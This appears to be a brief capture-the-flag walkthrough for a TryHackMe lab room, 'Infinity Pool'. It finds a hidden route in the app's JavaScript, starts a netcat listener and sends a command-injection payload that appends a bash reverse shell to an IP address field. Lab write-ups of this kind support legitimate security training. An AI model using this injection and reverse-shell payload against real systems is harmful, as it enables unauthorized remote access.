<p align="center">
  <img src="https://tryhackme.com/_next/image?url=https%3A%2F%2Fcdn-images.tryhackme.com%2Froom-icons%2F5dbea226085ab6182a2ee0f7-1785251854806&w=96&q=75"> 
</p>

# Infinity Pool

Target application:
```URL
https://MACHINE_IP
```

## STEP 01
- Open the webapp
```URL
https://MACHINE_IP
```
- Then open `View source.`

- Then find
  ```
  app.js 
  ```
- Open it
- It contains the route
- Then try that route
  ```
  https://MACHINE_IP/ROUTE
  ```

## STEP 02
- Then run `nc listener`
  ```bash
  nc -nvlp 2500
  ```
- Then use this payload
  ```
  127.0.0.1;bash -c 'bash -i >& /dev/tcp/192.168.181.19/2500 0>&1'
  ```
- Check the file directory
  
## You will find the  **FLAGs** 🚩

# Congratulations on our Exploration 🎉
